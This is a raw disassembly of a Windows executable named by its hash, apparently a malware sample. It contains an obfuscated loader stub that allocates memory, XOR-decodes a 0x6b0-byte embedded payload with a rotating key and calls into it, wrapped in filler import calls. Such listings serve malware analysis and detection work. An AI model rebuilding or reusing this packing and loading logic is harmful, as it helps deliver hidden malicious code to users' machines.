
33396f653a2a146163576503344828d4a9747c3b9ee91d05c7c2c4e21cd37630.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    edi,edi
  401002:	push   ebp
  401003:	mov    ebp,esp
  401005:	sub    esp,0x34
  401008:	push   edx
  401009:	mov    esi,0x0
  40100e:	push   esi
  40100f:	push   0x403008
  401014:	pop    eax
  401015:	call   DWORD PTR cs:[eax]
  401018:	pop    edx
  401019:	push   edx
  40101a:	push   edi
  40101b:	push   DWORD PTR [edx+0x50]
  40101e:	call   0x401930
  401023:	add    esp,0x8
  401026:	pop    edx
  401027:	push   edx
  401028:	mov    ecx,0x0
  40102d:	push   ecx
  40102e:	push   0x403078
  401033:	pop    eax
  401034:	call   DWORD PTR cs:[eax]
  401037:	pop    edx
  401038:	sub    esp,0xffffffcc
  40103b:	mov    ebp,DWORD PTR [esp]
  40103e:	add    esp,0x4
  401041:	ret    
  401042:	add    BYTE PTR [eax],al
  401044:	mov    edi,edi
  401046:	push   ebp
  401047:	mov    ebp,esp
  401049:	sub    esp,0x3c
  40104c:	push   edx
  40104d:	push   ecx
  40104e:	push   DWORD PTR [edx+0x478]
  401054:	call   0x401db8
  401059:	add    esp,0x8
  40105c:	pop    edx
  40105d:	push   edx
  40105e:	push   0x0
  401060:	push   0x40304c
  401065:	pop    eax
  401066:	call   DWORD PTR cs:[eax]
  401069:	pop    edx
  40106a:	push   edx
  40106b:	push   0x0
  40106d:	push   0x40304c
  401072:	pop    eax
  401073:	call   DWORD PTR cs:[eax]
  401076:	pop    edx
  401077:	sub    esp,0xffffffc4
  40107a:	mov    ebp,DWORD PTR [esp]
  40107d:	add    esp,0x4
  401080:	ret    
  401081:	add    BYTE PTR [eax],al
  401083:	add    BYTE PTR [edi],cl
  401085:	adc    BYTE PTR [edx+0x0],0x0
  40108c:	add    BYTE PTR [eax],al
  40108e:	add    BYTE PTR [eax],al
  401090:	mov    edi,edi
  401092:	push   ebp
  401093:	mov    ebp,esp
  401095:	sub    esp,0x1c
  401098:	push   edx
  401099:	mov    ebx,0x0
  40109e:	push   ebx
  40109f:	push   0x40302c
  4010a4:	pop    eax
  4010a5:	call   DWORD PTR cs:[eax]
  4010a8:	pop    edx
  4010a9:	push   edx
  4010aa:	push   eax
  4010ab:	push   DWORD PTR [edx+0x3a4]
  4010b1:	push   DWORD PTR [edx+0x460]
  4010b7:	call   0x40157c
  4010bc:	add    esp,0xc
  4010bf:	pop    edx
  4010c0:	push   edx
  4010c1:	push   0x0
  4010c3:	push   0x403078
  4010c8:	pop    eax
  4010c9:	call   DWORD PTR cs:[eax]
  4010cc:	pop    edx
  4010cd:	sub    esp,0xffffffe4
  4010d0:	mov    ebp,DWORD PTR [esp]
  4010d3:	add    esp,0x4
  4010d6:	ret    
  4010d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4010dd:	sub    esp,0x54
  4010e0:	push   edx
  4010e1:	push   0x0
  4010e3:	push   0x403008
  4010e8:	pop    eax
  4010e9:	call   DWORD PTR cs:[eax]
  4010ec:	pop    edx
  4010ed:	push   edx
  4010ee:	push   edi
  4010ef:	push   eax
  4010f0:	push   DWORD PTR [edx+0x5b0]
  4010f6:	push   DWORD PTR [edx+0x528]
  4010fc:	call   0x401490
  401101:	add    esp,0x10
  401104:	pop    edx
  401105:	push   edx
  401106:	push   0x0
  401108:	push   0x403008
  40110d:	pop    eax
  40110e:	call   DWORD PTR cs:[eax]
  401111:	pop    edx
  401112:	sub    esp,0xffffffac
  401115:	mov    ebp,DWORD PTR [esp]
  401118:	add    esp,0x4
  40111b:	ret    
  40111c:	mov    edi,edi
  40111e:	pusha  
  40111f:	push   ebp
  401120:	mov    ebp,esp
  401122:	sub    esp,0x5c
  401125:	push   edx
  401126:	push   0x0
  401128:	push   0x403008
  40112d:	pop    eax
  40112e:	call   DWORD PTR cs:[eax]
  401131:	pop    edx
  401132:	test   eax,eax
  401134:	je     0x401137
  401136:	ret    
  401137:	push   edx
  401138:	push   DWORD PTR [edx+0xd4]
  40113e:	push   DWORD PTR [edx+0x2f4]
  401144:	push   DWORD PTR [edx+0x240]
  40114a:	call   0x401790
  40114f:	add    esp,0xc
  401152:	pop    edx
  401153:	push   edx
  401154:	mov    ecx,0x0
  401159:	push   ecx
  40115a:	push   0x40303c
  40115f:	pop    eax
  401160:	call   DWORD PTR cs:[eax]
  401163:	pop    edx
  401164:	mov    ebx,0x403028
  401169:	mov    ebx,DWORD PTR [ebx]
  40116b:	push   ebx
  40116c:	push   DWORD PTR [edx+0x218]
  401172:	pop    esi
  401173:	call   esi
  401175:	sub    esp,0xffffffa4
  401178:	mov    ebp,DWORD PTR [esp]
  40117b:	add    esp,0x4
  40117e:	ret    
  40117f:	add    BYTE PTR [eax],al
  401181:	add    BYTE PTR [eax],al
  401183:	add    BYTE PTR [ebx-0x1374aa01],cl
  401189:	sub    esp,0x28
  40118c:	push   edx
  40118d:	push   DWORD PTR [edx+0x4c8]
  401193:	push   DWORD PTR [edx+0xe4]
  401199:	push   ecx
  40119a:	call   0x401330
  40119f:	add    esp,0xc
  4011a2:	pop    edx
  4011a3:	push   edx
  4011a4:	push   0x0
  4011a6:	push   0x403078
  4011ab:	pop    eax
  4011ac:	call   DWORD PTR cs:[eax]
  4011af:	pop    edx
  4011b0:	push   edx
  4011b1:	mov    esi,0x0
  4011b6:	push   esi
  4011b7:	push   0x403040
  4011bc:	pop    eax
  4011bd:	call   DWORD PTR cs:[eax]
  4011c0:	pop    edx
  4011c1:	sub    esp,0xffffffd8
  4011c4:	mov    ebp,DWORD PTR [esp]
  4011c7:	add    esp,0x4
  4011ca:	ret    
  4011cb:	add    BYTE PTR [eax],al
  4011cd:	add    BYTE PTR [eax],al
  4011cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4011d5:	sub    esp,0x30
  4011d8:	push   edx
  4011d9:	push   0x0
  4011db:	push   0x40302c
  4011e0:	pop    eax
  4011e1:	call   DWORD PTR cs:[eax]
  4011e4:	pop    edx
  4011e5:	push   edx
  4011e6:	push   eax
  4011e7:	push   edi
  4011e8:	push   ecx
  4011e9:	push   edi
  4011ea:	call   0x4010d8
  4011ef:	add    esp,0x10
  4011f2:	pop    edx
  4011f3:	push   edx
  4011f4:	push   0x403010
  4011f9:	pop    eax
  4011fa:	call   DWORD PTR cs:[eax]
  4011fd:	pop    edx
  4011fe:	sub    esp,0xffffffd0
  401201:	mov    ebp,DWORD PTR [esp]
  401204:	add    esp,0x4
  401207:	ret    
  401208:	mov    edi,edi
  40120a:	push   ebp
  40120b:	mov    ebp,esp
  40120d:	sub    esp,0x2c
  401210:	push   edx
  401211:	push   0x403010
  401216:	pop    eax
  401217:	call   DWORD PTR cs:[eax]
  40121a:	pop    edx
  40121b:	push   edx
  40121c:	push   eax
  40121d:	push   DWORD PTR [edx+0x4b8]
  401223:	call   0x401604
  401228:	add    esp,0x8
  40122b:	pop    edx
  40122c:	push   edx
  40122d:	mov    esi,0x0
  401232:	push   esi
  401233:	push   0x40302c
  401238:	pop    eax
  401239:	call   DWORD PTR cs:[eax]
  40123c:	pop    edx
  40123d:	sub    esp,0xffffffd4
  401240:	mov    ebp,DWORD PTR [esp]
  401243:	add    esp,0x4
  401246:	ret    
  401247:	add    BYTE PTR [ebx-0x1374aa01],cl
  40124d:	sub    esp,0x58
  401250:	push   edx
  401251:	mov    eax,0x0
  401256:	push   eax
  401257:	push   0x403018
  40125c:	pop    eax
  40125d:	call   DWORD PTR cs:[eax]
  401260:	pop    edx
  401261:	push   edx
  401262:	push   DWORD PTR [edx+0x544]
  401268:	push   DWORD PTR [edx+0x134]
  40126e:	push   DWORD PTR [edx+0x4f4]
  401274:	push   edi
  401275:	call   0x4013ec
  40127a:	add    esp,0x10
  40127d:	pop    edx
  40127e:	push   edx
  40127f:	push   0x0
  401281:	push   0x40300c
  401286:	pop    eax
  401287:	call   DWORD PTR cs:[eax]
  40128a:	pop    edx
  40128b:	sub    esp,0xffffffa8
  40128e:	mov    ebp,DWORD PTR [esp]
  401291:	add    esp,0x4
  401294:	ret    
  401295:	add    BYTE PTR [eax],al
  401297:	add    BYTE PTR [ebx-0x1374aa01],cl
  40129d:	sub    esp,0x30
  4012a0:	push   edx
  4012a1:	mov    eax,0x0
  4012a6:	push   eax
  4012a7:	push   0x40302c
  4012ac:	pop    eax
  4012ad:	call   DWORD PTR cs:[eax]
  4012b0:	pop    edx
  4012b1:	push   edx
  4012b2:	push   DWORD PTR [edx+0x40c]
  4012b8:	push   DWORD PTR [edx+0x15c]
  4012be:	push   DWORD PTR [edx+0x18c]
  4012c4:	push   ebx
  4012c5:	call   0x401d30
  4012ca:	add    esp,0x10
  4012cd:	pop    edx
  4012ce:	push   edx
  4012cf:	lea    esi,[edx]
  4012d1:	push   esi
  4012d2:	push   0x403028
  4012d7:	pop    eax
  4012d8:	call   DWORD PTR cs:[eax]
  4012db:	test   eax,eax
  4012dd:	jne    0x4012cf
  4012df:	pop    edx
  4012e0:	sub    esp,0xffffffd0
  4012e3:	mov    ebp,DWORD PTR [esp]
  4012e6:	add    esp,0x4
  4012e9:	ret    
  4012ea:	add    BYTE PTR [eax],al
  4012ec:	mov    edi,edi
  4012ee:	push   ebp
  4012ef:	mov    ebp,esp
  4012f1:	sub    esp,0x30
  4012f4:	push   edx
  4012f5:	push   0x0
  4012f7:	push   0x403000
  4012fc:	pop    eax
  4012fd:	call   DWORD PTR cs:[eax]
  401300:	pop    edx
  401301:	push   edx
  401302:	push   esi
  401303:	push   DWORD PTR [edx+0xf0]
  401309:	push   DWORD PTR [edx+0x18c]
  40130f:	call   0x401ca4
  401314:	add    esp,0xc
  401317:	pop    edx
  401318:	push   edx
  401319:	push   0x0
  40131b:	push   0x403008
  401320:	pop    eax
  401321:	call   DWORD PTR cs:[eax]
  401324:	pop    edx
  401325:	sub    esp,0xffffffd0
  401328:	mov    ebp,DWORD PTR [esp]
  40132b:	add    esp,0x4
  40132e:	ret    
  40132f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401335:	sub    esp,0x3c
  401338:	push   edx
  401339:	push   esi
  40133a:	push   ecx
  40133b:	call   0x401820
  401340:	add    esp,0x8
  401343:	pop    edx
  401344:	push   edx
  401345:	push   0x403010
  40134a:	pop    eax
  40134b:	call   DWORD PTR cs:[eax]
  40134e:	pop    edx
  40134f:	push   edx
  401350:	push   0x403010
  401355:	pop    eax
  401356:	call   DWORD PTR cs:[eax]
  401359:	pop    edx
  40135a:	sub    esp,0xffffffc4
  40135d:	mov    ebp,DWORD PTR [esp]
  401360:	add    esp,0x4
  401363:	ret    
  401364:	mov    edi,edi
  401366:	push   ebp
  401367:	mov    ebp,esp
  401369:	sub    esp,0x24
  40136c:	push   edx
  40136d:	push   0x0
  40136f:	push   0x403068
  401374:	pop    eax
  401375:	call   DWORD PTR cs:[eax]
  401378:	pop    edx
  401379:	push   edx
  40137a:	push   DWORD PTR [edx+0x53c]
  401380:	push   DWORD PTR [edx+0x388]
  401386:	push   edi
  401387:	call   0x401208
  40138c:	add    esp,0xc
  40138f:	pop    edx
  401390:	push   edx
  401391:	push   0x403004
  401396:	pop    eax
  401397:	call   DWORD PTR cs:[eax]
  40139a:	pop    edx
  40139b:	sub    esp,0xffffffdc
  40139e:	mov    ebp,DWORD PTR [esp]
  4013a1:	add    esp,0x4
  4013a4:	ret    
  4013a5:	add    BYTE PTR [eax],al
  4013a7:	add    BYTE PTR [eax],al
  4013a9:	add    BYTE PTR [eax],al
  4013ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013b1:	sub    esp,0x40
  4013b4:	push   edx
  4013b5:	push   0x403010
  4013ba:	pop    eax
  4013bb:	call   DWORD PTR cs:[eax]
  4013be:	pop    edx
  4013bf:	push   edx
  4013c0:	push   eax
  4013c1:	push   DWORD PTR [edx+0x94]
  4013c7:	push   DWORD PTR [edx+0xac]
  4013cd:	push   eax
  4013ce:	call   0x401184
  4013d3:	add    esp,0x10
  4013d6:	pop    edx
  4013d7:	push   edx
  4013d8:	push   0x403004
  4013dd:	pop    eax
  4013de:	call   DWORD PTR cs:[eax]
  4013e1:	pop    edx
  4013e2:	sub    esp,0xffffffc0
  4013e5:	mov    ebp,DWORD PTR [esp]
  4013e8:	add    esp,0x4
  4013eb:	ret    
  4013ec:	mov    edi,edi
  4013ee:	push   ebp
  4013ef:	mov    ebp,esp
  4013f1:	sub    esp,0x28
  4013f4:	push   edx
  4013f5:	mov    esi,0x6b0
  4013fa:	push   esi
  4013fb:	push   0x6b0
  401400:	push   0x40000
  401405:	push   0x403038
  40140a:	pop    ebx
  40140b:	push   DWORD PTR [ebx]
  40140d:	sub    DWORD PTR [esp],0x2
  401411:	push   0x40301c
  401416:	pop    ebx
  401417:	pop    DWORD PTR [ebx]
  401419:	push   0x40301c
  40141e:	pop    eax
  40141f:	call   DWORD PTR cs:[eax]
  401422:	xchg   DWORD PTR [esp],eax
  401425:	mov    edx,eax
  401427:	pop    esi
  401428:	mov    DWORD PTR [edx+0x218],esi
  40142e:	mov    esi,DWORD PTR [edx+0x218]
  401434:	mov    ecx,esi
  401436:	sub    edi,edi
  401438:	dec    edi
  401439:	and    edi,0x401ea5
  40143f:	mov    esi,DWORD PTR [edi]
  401441:	mov    DWORD PTR [ecx],esi
  401443:	add    edi,0x3
  401446:	add    ecx,0x3
  401449:	mov    esi,0x6a719112
  40144e:	xor    ebx,ebx
  401450:	cmp    ebx,0x6b0
  401456:	je     0x401474
  401458:	sub    ebx,0xfffffffc
  40145b:	mov    eax,esi
  40145d:	xor    eax,DWORD PTR [edi]
  40145f:	sub    eax,0x1
  401462:	mov    DWORD PTR [ecx],eax
  401464:	push   DWORD PTR [ecx]
  401466:	mov    esi,0xfffffffc
  40146b:	sub    edi,esi
  40146d:	sub    ecx,esi
  40146f:	pop    esi
  401470:	bswap  esi
  401472:	jmp    0x401450
  401474:	push   edx
  401475:	mov    edx,0x0
  40147a:	push   edx
  40147b:	push   0x403000
  401480:	pop    eax
  401481:	call   DWORD PTR cs:[eax]
  401484:	pop    edx
  401485:	sub    esp,0xffffffd8
  401488:	pop    ebp
  401489:	ret    
  40148a:	add    BYTE PTR [eax],al
  40148c:	add    BYTE PTR [eax],al
  40148e:	add    BYTE PTR [eax],al
  401490:	mov    edi,edi
  401492:	push   ebp
  401493:	mov    ebp,esp
  401495:	sub    esp,0x28
  401498:	push   edx
  401499:	push   0x0
  40149b:	push   0x403020
  4014a0:	pop    eax
  4014a1:	call   DWORD PTR cs:[eax]
  4014a4:	pop    edx
  4014a5:	push   edx
  4014a6:	push   DWORD PTR [edx+0x5a8]
  4014ac:	push   DWORD PTR [edx+0x3e4]
  4014b2:	push   DWORD PTR [edx+0x4b0]
  4014b8:	call   0x401e44
  4014bd:	add    esp,0xc
  4014c0:	pop    edx
  4014c1:	push   edx
  4014c2:	mov    esi,0x0
  4014c7:	push   esi
  4014c8:	push   0x40304c
  4014cd:	pop    eax
  4014ce:	call   DWORD PTR cs:[eax]
  4014d1:	pop    edx
  4014d2:	sub    esp,0xffffffd8
  4014d5:	mov    ebp,DWORD PTR [esp]
  4014d8:	add    esp,0x4
  4014db:	ret    
  4014dc:	mov    edi,edi
  4014de:	push   ebp
  4014df:	mov    ebp,esp
  4014e1:	sub    esp,0x54
  4014e4:	push   edx
  4014e5:	mov    ecx,0x0
  4014ea:	push   ecx
  4014eb:	push   0x403000
  4014f0:	pop    eax
  4014f1:	call   DWORD PTR cs:[eax]
  4014f4:	pop    edx
  4014f5:	push   edx
  4014f6:	push   DWORD PTR [edx+0x4f4]
  4014fc:	push   DWORD PTR [edx+0x5c0]
  401502:	push   eax
  401503:	call   0x4011d0
  401508:	add    esp,0xc
  40150b:	pop    edx
  40150c:	push   edx
  40150d:	push   0x0
  40150f:	push   0x403040
  401514:	pop    eax
  401515:	call   DWORD PTR cs:[eax]
  401518:	pop    edx
  401519:	sub    esp,0xffffffac
  40151c:	mov    ebp,DWORD PTR [esp]
  40151f:	add    esp,0x4
  401522:	ret    
  401523:	add    BYTE PTR [ebx-0x1374aa01],cl
  401529:	sub    esp,0x24
  40152c:	push   edx
  40152d:	push   DWORD PTR [edx+0x53c]
  401533:	push   DWORD PTR [edx+0x1c]
  401536:	push   DWORD PTR [edx+0x178]
  40153c:	call   0x401298
  401541:	add    esp,0xc
  401544:	pop    edx
  401545:	push   edx
  401546:	mov    eax,0x0
  40154b:	push   eax
  40154c:	push   0x40302c
  401551:	pop    eax
  401552:	call   DWORD PTR cs:[eax]
  401555:	pop    edx
  401556:	push   edx
  401557:	mov    ecx,0x0
  40155c:	push   ecx
  40155d:	push   0x40302c
  401562:	pop    eax
  401563:	call   DWORD PTR cs:[eax]
  401566:	pop    edx
  401567:	sub    esp,0xffffffdc
  40156a:	mov    ebp,DWORD PTR [esp]
  40156d:	add    esp,0x4
  401570:	ret    
	...
  401579:	add    BYTE PTR [eax],al
  40157b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401581:	sub    esp,0x60
  401584:	push   edx
  401585:	mov    ebx,0x0
  40158a:	push   ebx
  40158b:	push   0x403078
  401590:	pop    eax
  401591:	call   DWORD PTR cs:[eax]
  401594:	pop    edx
  401595:	push   edx
  401596:	push   eax
  401597:	push   esi
  401598:	push   esi
  401599:	push   DWORD PTR [edx+0x19c]
  40159f:	call   0x401d6c
  4015a4:	add    esp,0x10
  4015a7:	pop    edx
  4015a8:	push   edx
  4015a9:	push   0x0
  4015ab:	push   0x40303c
  4015b0:	pop    eax
  4015b1:	call   DWORD PTR cs:[eax]
  4015b4:	pop    edx
  4015b5:	sub    esp,0xffffffa0
  4015b8:	mov    ebp,DWORD PTR [esp]
  4015bb:	add    esp,0x4
  4015be:	ret    
  4015bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015c5:	sub    esp,0x20
  4015c8:	push   edx
  4015c9:	push   ebx
  4015ca:	push   DWORD PTR [edx+0x298]
  4015d0:	push   DWORD PTR [edx+0x138]
  4015d6:	call   0x4018a8
  4015db:	add    esp,0xc
  4015de:	pop    edx
  4015df:	push   edx
  4015e0:	push   0x0
  4015e2:	push   0x403008
  4015e7:	pop    eax
  4015e8:	call   DWORD PTR cs:[eax]
  4015eb:	pop    edx
  4015ec:	push   edx
  4015ed:	push   0x403010
  4015f2:	pop    eax
  4015f3:	call   DWORD PTR cs:[eax]
  4015f6:	pop    edx
  4015f7:	sub    esp,0xffffffe0
  4015fa:	mov    ebp,DWORD PTR [esp]
  4015fd:	add    esp,0x4
  401600:	ret    
  401601:	add    BYTE PTR [eax],al
  401603:	add    BYTE PTR [ebx-0x1374aa01],cl
  401609:	sub    esp,0x28
  40160c:	push   edx
  40160d:	push   ebx
  40160e:	push   DWORD PTR [edx+0x1f0]
  401614:	push   DWORD PTR [edx+0xa8]
  40161a:	push   DWORD PTR [edx+0x400]
  401620:	call   0x4018ec
  401625:	add    esp,0x10
  401628:	pop    edx
  401629:	push   edx
  40162a:	mov    edi,0x0
  40162f:	push   edi
  401630:	push   0x40300c
  401635:	pop    eax
  401636:	call   DWORD PTR cs:[eax]
  401639:	pop    edx
  40163a:	push   edx
  40163b:	push   0x0
  40163d:	push   0x40302c
  401642:	pop    eax
  401643:	call   DWORD PTR cs:[eax]
  401646:	pop    edx
  401647:	sub    esp,0xffffffd8
  40164a:	mov    ebp,DWORD PTR [esp]
  40164d:	add    esp,0x4
  401650:	ret    
  401651:	add    BYTE PTR [eax],al
  401653:	add    BYTE PTR [eax],al
  401655:	add    BYTE PTR [eax],al
  401657:	add    BYTE PTR [ebx],ch
  401659:	rol    BYTE PTR [ecx+0x47f000c2],cl
  40165f:	add    BYTE PTR [edx+0x33],dl
  401662:	leave  
  401663:	or     ecx,0x403090
  401669:	and    WORD PTR [ecx],0x0
  40166d:	push   DWORD PTR [ecx]
  40166f:	pop    eax
  401670:	mov    edx,eax
  401672:	push   0x3c
  401674:	add    DWORD PTR [esp],eax
  401677:	pop    ecx
  401678:	push   eax
  401679:	mov    edi,esp
  40167b:	mov    esi,ecx
  40167d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40167e:	pop    eax
  40167f:	mov    edx,DWORD PTR [eax+edx*1+0x1c]
  401683:	ror    edx,0x8
  401686:	xor    eax,eax
  401688:	or     al,0x80
  40168a:	cmp    al,dl
  40168c:	pop    edx
  40168d:	ja     0x401698
  40168f:	nop
  401690:	nop
  401691:	nop
  401692:	nop
  401693:	jmp    0x401084
  401698:	xor    esp,esp
  40169a:	int    0x3
  40169c:	mov    edi,edi
  40169e:	push   ebp
  40169f:	mov    ebp,esp
  4016a1:	sub    esp,0x24
  4016a4:	push   edx
  4016a5:	push   0x0
  4016a7:	push   0x40303c
  4016ac:	pop    eax
  4016ad:	call   DWORD PTR cs:[eax]
  4016b0:	pop    edx
  4016b1:	push   edx
  4016b2:	push   ecx
  4016b3:	push   DWORD PTR [edx+0x3d4]
  4016b9:	push   ebx
  4016ba:	push   esi
  4016bb:	call   0x40197c
  4016c0:	add    esp,0x10
  4016c3:	pop    edx
  4016c4:	push   edx
  4016c5:	push   0x0
  4016c7:	push   0x40300c
  4016cc:	pop    eax
  4016cd:	call   DWORD PTR cs:[eax]
  4016d0:	pop    edx
  4016d1:	sub    esp,0xffffffdc
  4016d4:	mov    ebp,DWORD PTR [esp]
  4016d7:	add    esp,0x4
  4016da:	ret    
	...
  4016f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4016fd:	sub    esp,0x30
  401700:	push   edx
  401701:	push   0x0
  401703:	push   0x40304c
  401708:	pop    eax
  401709:	call   DWORD PTR cs:[eax]
  40170c:	pop    edx
  40170d:	push   edx
  40170e:	push   DWORD PTR [edx+0x3c8]
  401714:	push   DWORD PTR [edx+0x3c4]
  40171a:	call   0x401090
  40171f:	add    esp,0x8
  401722:	pop    edx
  401723:	push   edx
  401724:	mov    ecx,0x0
  401729:	push   ecx
  40172a:	push   0x40300c
  40172f:	pop    eax
  401730:	call   DWORD PTR cs:[eax]
  401733:	pop    edx
  401734:	sub    esp,0xffffffd0
  401737:	mov    ebp,DWORD PTR [esp]
  40173a:	add    esp,0x4
  40173d:	ret    
  40173e:	add    BYTE PTR [eax],al
  401740:	mov    edi,edi
  401742:	push   ebp
  401743:	mov    ebp,esp
  401745:	sub    esp,0x24
  401748:	push   edx
  401749:	push   DWORD PTR [edx+0x2ac]
  40174f:	push   ecx
  401750:	push   ecx
  401751:	call   0x4017d8
  401756:	add    esp,0xc
  401759:	pop    edx
  40175a:	push   edx
  40175b:	push   0x0
  40175d:	push   0x403040
  401762:	pop    eax
  401763:	call   DWORD PTR cs:[eax]
  401766:	pop    edx
  401767:	push   edx
  401768:	mov    edx,0x0
  40176d:	push   edx
  40176e:	push   0x403008
  401773:	pop    eax
  401774:	call   DWORD PTR cs:[eax]
  401777:	pop    edx
  401778:	sub    esp,0xffffffdc
  40177b:	mov    ebp,DWORD PTR [esp]
  40177e:	add    esp,0x4
  401781:	ret    
	...
  40178e:	add    BYTE PTR [eax],al
  401790:	mov    edi,edi
  401792:	push   ebp
  401793:	mov    ebp,esp
  401795:	sub    esp,0x5c
  401798:	push   edx
  401799:	push   ecx
  40179a:	push   DWORD PTR [edx+0x94]
  4017a0:	call   0x401cf4
  4017a5:	add    esp,0x8
  4017a8:	pop    edx
  4017a9:	push   edx
  4017aa:	push   0x0
  4017ac:	push   0x403008
  4017b1:	pop    eax
  4017b2:	call   DWORD PTR cs:[eax]
  4017b5:	pop    edx
  4017b6:	push   edx
  4017b7:	mov    ecx,0x0
  4017bc:	push   ecx
  4017bd:	push   0x403040
  4017c2:	pop    eax
  4017c3:	call   DWORD PTR cs:[eax]
  4017c6:	pop    edx
  4017c7:	sub    esp,0xffffffa4
  4017ca:	mov    ebp,DWORD PTR [esp]
  4017cd:	add    esp,0x4
  4017d0:	ret    
  4017d1:	add    BYTE PTR [eax],al
  4017d3:	add    BYTE PTR [eax],al
  4017d5:	add    BYTE PTR [eax],al
  4017d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4017dd:	sub    esp,0x44
  4017e0:	push   edx
  4017e1:	mov    ebx,0x0
  4017e6:	push   ebx
  4017e7:	push   0x40300c
  4017ec:	pop    eax
  4017ed:	call   DWORD PTR cs:[eax]
  4017f0:	pop    edx
  4017f1:	push   edx
  4017f2:	push   DWORD PTR [edx+0x5a0]
  4017f8:	push   DWORD PTR [edx+0x2ec]
  4017fe:	call   0x401b80
  401803:	add    esp,0x8
  401806:	pop    edx
  401807:	push   edx
  401808:	push   0x0
  40180a:	push   0x403078
  40180f:	pop    eax
  401810:	call   DWORD PTR cs:[eax]
  401813:	pop    edx
  401814:	sub    esp,0xffffffbc
  401817:	mov    ebp,DWORD PTR [esp]
  40181a:	add    esp,0x4
  40181d:	ret    
  40181e:	add    BYTE PTR [eax],al
  401820:	mov    edi,edi
  401822:	push   ebp
  401823:	mov    ebp,esp
  401825:	sub    esp,0x5c
  401828:	push   edx
  401829:	push   ecx
  40182a:	push   ecx
  40182b:	push   ecx
  40182c:	push   eax
  40182d:	call   0x401000
  401832:	add    esp,0x10
  401835:	pop    edx
  401836:	push   edx
  401837:	mov    eax,0x0
  40183c:	push   eax
  40183d:	push   0x40304c
  401842:	pop    eax
  401843:	call   DWORD PTR cs:[eax]
  401846:	pop    edx
  401847:	push   edx
  401848:	push   0x0
  40184a:	push   0x40302c
  40184f:	pop    eax
  401850:	call   DWORD PTR cs:[eax]
  401853:	pop    edx
  401854:	sub    esp,0xffffffa4
  401857:	mov    ebp,DWORD PTR [esp]
  40185a:	add    esp,0x4
  40185d:	ret    
  40185e:	add    BYTE PTR [eax],al
  401860:	mov    edi,edi
  401862:	push   ebp
  401863:	mov    ebp,esp
  401865:	sub    esp,0x2c
  401868:	push   edx
  401869:	push   0x0
  40186b:	push   0x403058
  401870:	pop    eax
  401871:	call   DWORD PTR cs:[eax]
  401874:	pop    edx
  401875:	push   edx
  401876:	push   edi
  401877:	push   DWORD PTR [edx+0x498]
  40187d:	push   DWORD PTR [edx+0xe8]
  401883:	push   ebx
  401884:	call   0x401044
  401889:	add    esp,0x10
  40188c:	pop    edx
  40188d:	push   edx
  40188e:	mov    ebx,0x0
  401893:	push   ebx
  401894:	push   0x403068
  401899:	pop    eax
  40189a:	call   DWORD PTR cs:[eax]
  40189d:	pop    edx
  40189e:	sub    esp,0xffffffd4
  4018a1:	mov    ebp,DWORD PTR [esp]
  4018a4:	add    esp,0x4
  4018a7:	ret    
  4018a8:	mov    edi,edi
  4018aa:	push   ebp
  4018ab:	mov    ebp,esp
  4018ad:	sub    esp,0x38
  4018b0:	push   edx
  4018b1:	push   edi
  4018b2:	push   DWORD PTR [edx+0x15c]
  4018b8:	call   0x401364
  4018bd:	add    esp,0x8
  4018c0:	pop    edx
  4018c1:	push   edx
  4018c2:	mov    edi,0x0
  4018c7:	push   edi
  4018c8:	push   0x40302c
  4018cd:	pop    eax
  4018ce:	call   DWORD PTR cs:[eax]
  4018d1:	pop    edx
  4018d2:	push   edx
  4018d3:	push   0x0
  4018d5:	push   0x403078
  4018da:	pop    eax
  4018db:	call   DWORD PTR cs:[eax]
  4018de:	pop    edx
  4018df:	sub    esp,0xffffffc8
  4018e2:	mov    ebp,DWORD PTR [esp]
  4018e5:	add    esp,0x4
  4018e8:	ret    
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4018f1:	sub    esp,0x4c
  4018f4:	push   edx
  4018f5:	mov    esi,0x0
  4018fa:	push   esi
  4018fb:	push   0x40303c
  401900:	pop    eax
  401901:	call   DWORD PTR cs:[eax]
  401904:	pop    edx
  401905:	push   edx
  401906:	push   DWORD PTR [edx+0x58c]
  40190c:	push   ecx
  40190d:	call   0x40169c
  401912:	add    esp,0x8
  401915:	pop    edx
  401916:	push   edx
  401917:	push   0x0
  401919:	push   0x403018
  40191e:	pop    eax
  40191f:	call   DWORD PTR cs:[eax]
  401922:	pop    edx
  401923:	sub    esp,0xffffffb4
  401926:	mov    ebp,DWORD PTR [esp]
  401929:	add    esp,0x4
  40192c:	ret    
  40192d:	add    BYTE PTR [eax],al
  40192f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401935:	sub    esp,0x2c
  401938:	push   edx
  401939:	push   ebx
  40193a:	push   ecx
  40193b:	push   edi
  40193c:	push   DWORD PTR [edx+0x28]
  40193f:	call   0x401aa4
  401944:	add    esp,0x10
  401947:	pop    edx
  401948:	push   edx
  401949:	mov    ecx,0x0
  40194e:	push   ecx
  40194f:	push   0x403068
  401954:	pop    eax
  401955:	call   DWORD PTR cs:[eax]
  401958:	pop    edx
  401959:	push   edx
  40195a:	push   0x403010
  40195f:	pop    eax
  401960:	call   DWORD PTR cs:[eax]
  401963:	pop    edx
  401964:	sub    esp,0xffffffd4
  401967:	mov    ebp,DWORD PTR [esp]
  40196a:	add    esp,0x4
  40196d:	ret    
	...
  40197a:	add    BYTE PTR [eax],al
  40197c:	mov    edi,edi
  40197e:	push   ebp
  40197f:	mov    ebp,esp
  401981:	sub    esp,0x50
  401984:	push   edx
  401985:	push   esi
  401986:	push   DWORD PTR [edx+0x1d4]
  40198c:	push   DWORD PTR [edx+0x24c]
  401992:	push   ecx
  401993:	call   0x401af0
  401998:	add    esp,0x10
  40199b:	pop    edx
  40199c:	push   edx
  40199d:	lea    edi,[edx]
  40199f:	push   edi
  4019a0:	push   0x403028
  4019a5:	pop    eax
  4019a6:	call   DWORD PTR cs:[eax]
  4019a9:	test   eax,eax
  4019ab:	jne    0x40199d
  4019ad:	pop    edx
  4019ae:	push   edx
  4019af:	mov    edx,0x0
  4019b4:	push   edx
  4019b5:	push   0x403040
